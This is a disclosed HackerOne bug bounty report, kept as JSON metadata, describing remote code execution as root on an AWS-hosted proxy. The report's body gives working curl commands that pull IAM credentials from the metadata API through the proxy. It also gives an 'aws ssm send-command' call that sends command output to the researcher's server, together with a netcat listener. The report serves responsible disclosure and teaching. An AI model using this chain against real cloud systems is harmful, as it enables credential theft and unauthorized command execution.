{"id":401136,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDExMzY=","url":"https://hackerone.com/reports/401136","title":"Remote Code Execution on Proxy Service (as root)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-09-28T17:44:07.000Z","submitted_at":"2017-09-28T17:44:07.000Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"michiel","url":"/michiel","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":31807,"url":"https://hackerone.com/redact","handle":"redact","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"profile":{"name":"██████","twitter_handle":"","website":"","about":"██████ "}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":true,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-08-27T17:48:44.909Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":null,"comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The proxy service used to provide researchers with access to certain programs on ██████ allows access to AWS's Metadata API. This Metadata API in turn is configured to expose temporary AWS access credentials for the AWS EC2 Run Command role. When this role is assumed by an AWS client (e.g. the CLI), it is possible to execute arbitrary commands on AWS EC2 instances.\n\n## Obtaining the AWS keys\nFirst up we are going to use cURL and to proof the AWS Metadata API is accessible:\n\n```\ncurl -vv http://169.254.169.254/latest/ -x '52.6.██.███:25603'\n```\n\nHere we are instructing cURL to load up AWS's Metadata API through the proxy. Since the proxy is hosted on AWS, and is not blocking traffic to internal IPs such as this API, we are able to gain access to it.\n\nTo generate a temporary pair of access keys, we will run the following command:\n\n```\ncurl -vv http://169.254.169.254/latest/meta-data/iam/security-credentials/runCommand -x '52.6.██.███:25603'\n```\n\nThe `runCommand` role is interesting and made me assume it was used for https://aws.amazon.com/ec2/run-command/.\n\n## Configuring AWS CLI\nYou will need to have the AWS CLI installed before you can continue.\n\nNow set the following environment variables:\n\n```\nexport AWS_ACCESS_KEY_ID=\u003c\"AccessKeyId\" you exposed in the last cURL command\u003e\nexport AWS_SECRET_ACCESS_KEY=\u003c\"SecretAccessKey\" you exposed in the last cURL commandt\u003e\nexport AWS_SESSION_TOKEN=\u003c\"Token\" you exposed in the last cURL command\u003e\n```\n\nNow in the same shell session you should be able to interact with several AWS services through the CLI.\n\n## Executing arbitrary commands as root\nSince the role name was `runCommand` I immediately went for AWS EC2 Systems Manager (specifically `aws ssm send-command`).\n\nWith the access keys configured, I ran the following AWS CLI command to proof the keys indeed did have sufficient permissions to execute arbitrary commands:\n\n```\naws ssm send-command --instance-ids \"i-05b████████adaa\" --document-name \"AWS-RunShellScript\" --comment \"whoami\" --parameters commands='curl 162.243.███.███:8080/`whoami`' --output text --region=us-east-1\n```\n\nOn my dev server I had a netcat listener running on port 8080 (`nc -vvkl 8080`) to capture the incoming cURL request. I also chose to execute a quick `whoami` command and pass it along as the path in the cURL HTTP call so I can quickly confirm what type of user is executing these commands.\n\nThe HTTP request came in as follows:\n\n```\nConnection from [52.73.██.██] port 8080 [tcp/http-alt] accepted (family 2, sport 45163)\nGET /root HTTP/1.1\nUser-Agent: curl/7.35.0\nHost: 162.243.███.███:8080\nAccept: */*\n```\n\nThis was enough proof for me to conclude command execution is possible and these commands are executed as **root**.\n\nNote that I only tried this on one instance, but I am expecting there are more instances in the `us-east-1` region that allow this type of command execution (and potentially instances in other regions as well).","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":75,"voters":["dirk","barbie_girl","dyuen","tomdev","krevetk0","cdl","smiegles","mashoud1122","jobert","hunter","and 65 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3254043,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2017-10-17T17:44:07.000Z","updated_at":"2017-10-17T17:44:07.000Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"michiel","url":"/michiel"},"genius_execution_id":null,"team_handle":"redact","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3254050,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-08-27T17:48:45.043Z","updated_at":"2018-08-27T17:48:45.043Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"redact","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":10013,"category":"researcher","content":"## Introduction\nI discovered this remote code execution (RCE) vulnerability on a proxy service used to track researcher activity. It was an opportunity for me to learn more about AWS, and specifically the dangers of AWS EC2 Systems Manager combined with an open metadata API. \n\n## Impact update\nAfter back and forth with the ██████ team, it became clear the vulnerable instance was hosted in a completely separate AWS account that was only shared with a limited number of identical instances. That makes it very unlikely this vulnerability could have been escalated to other applications such as ██████.com or ████.██████.com.\n\n## Disclosure\nAs a courtesy, I sent this write up to the organization prior to disclosure. Unfortunately, the program explicitly required anonymized disclosure, hence the heavy redaction. Despite the missing context from the disappointing lack of transparency, I hope the community still finds this summary valuable. \n\nEnjoy!","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":7,"username":"michiel","name":"Michiel Prins","bio":"Co-founder of HackerOne","cleared":true,"website":"https://hackerone.com","location":"San Francisco, CA","created_at":"2013-03-08T01:22:56.332Z","url":"https://hackerone.com/michiel","anc_triager":false,"hackerone_triager":false,"hackerone_employee":true,"hacker_resume_enabled":true,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}